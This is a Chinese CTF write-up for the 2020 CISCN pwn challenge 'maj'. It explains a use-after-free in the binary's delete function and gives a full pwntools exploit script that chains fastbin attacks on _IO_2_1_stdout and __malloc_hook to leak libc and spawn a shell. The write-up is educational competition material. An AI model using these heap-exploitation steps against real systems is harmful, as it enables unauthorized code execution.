# maj

## 来源
2020 ciscn


## 难度

5/ 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
 ```

## 简单描述

以前在v&n面试中, 有位师傅面过我这类型的, 基本思路也差不多, 经典的heap题, 有花指令影响逆向分析, 简单的添加功能,而添加功能所输入的字符临时储存在全局变量区中, 只有编辑功能才对堆区写入数据,还有删除功能, 打印功能没有。

## vul

在删除功能中, free后指针没有清0

```c
    else
    {
      sub_400846(dword_603010, dword_60303C + 1, dword_603040);
    }
    free(p_addr[v3]);                           // vul : not set ptr as null
    if ( dword_60303C / dword_603010 > 1 )
```



## 知识点

uaf, fastbin attack, IO file attack

## 思路

使用fastbin attack 打入_IO_2_1_stdout中泄漏libc, 然后再使用fastbin attack 此打入malloc_hook - 0x23处打one_gadget, realloc调整execve参数



## exp

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# author: i0gan
# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'

elf_path  = 'maj'
MODIFY_LD = 0
arch = '64'
libc_v = '2.23'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "0.0.0.0"
server_port = 0

# if local debug
LOCAL = 1
LIBC  = 1


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)
def ad(s, d):
	sla('>>', '1')
	sla('question', '80')
	sla('?', str(s))
	sa('?', d)
	
def rm(i):
	sla('>>', '2')
	sla('?', str(i))

def md(i, d):
	sla('>>', '4')
	sla('?', str(i))
	sa('?', d)

#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	ad(0x20, 'A' * 0x10) # fastbin attack unsorted bin - 0x10
	ad(0x60, 'A') # fake chunk
	ad(0x80, 'A') # partial write fastbin attack to _IO_2_1_stderr + 157
	ad(0x20, 'A') # fastbin attack to unsorted bin - 0x10
	ad(0x60, 'A') # idx 4 modify chunk 2 connect fastbin then attack to _IO_2_1_stdout
	# for fastbin attack to _free_hook
	ad(0x60, 'A') # idx 5 fa to malloc_hook - 0x23
	ad(0x60, 'A') # idx 6 
	
	# create fastbin attack
	rm(3)
	rm(0)
	rm(3)

	# free chunk2 make fd value as main_arena + 0x58
	rm(2)
	ad(0x20, 'A') # 7
	md(7, '\x90')
	ad(0x20, 'A') # 8
	ad(0x20, 'A') # 9
	md(1, b'A' * 0x50 + p64(0) + p64(0x31))
	ad(0x20, 'A') # 10
	
	md(10, p64(0) + p64(0x71) + b'\xdd\x25')

	rm(4)
	rm(1)
	rm(4)

	# attack to _IO_2_1_stderr + 157
	ad(0x60, 'A') # 11
	md(11, '\xa0')

	ad(0x60, 'A') # 12
	ad(0x60, 'A') # 13
	ad(0x60, 'A') # 14
	ad(0x60, 'A') # 15

	# leak libc
	p = b'A' * 0x33
	p += p64(0xfbad3c80)
	p += p64(0) * 3
	p += p8(8)
	md(15, p)
	
	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
	libc_base = leak - (0x7ffff7fc2608 - 0x7ffff7c26000)
	libc_base = leak - (0x7ffff7dd2608 - 0x7ffff7a0d000) # origin libc 2.23 ubuntu16
	libc.address = libc_base
	#main_arena = libc_base + 0x39bb20

	one_gadget = libc_base + 0x3f42a
	one_gadget = libc_base + 0xf0364 # original libc 2.23 ubuntu16

	li('leak: ' + hex(leak))
	li('libc_base: ' + hex(libc_base))
	
	# fastbin attack to malloc_hook - 0x23
	rm(5)
	rm(6)
	rm(5)
	ad(0x60, 'A') # 16
	p = p64(libc.sym['__malloc_hook'] - 0x23)
	md(16, p)
	ad(0x60, 'A') # 17
	ad(0x60, 'A') # 18
	ad(0x60, 'A') # 19
	p = b'A' * (0x13 - 0x8)
	p += p64(one_gadget)
	p += p64(libc.sym['realloc'] + 8)
	md(19, p)
	# get shell
	sla('>>', '1')
	sla('question', '80')
	#db()
	sla('?', str(10))


def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path})
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()

```

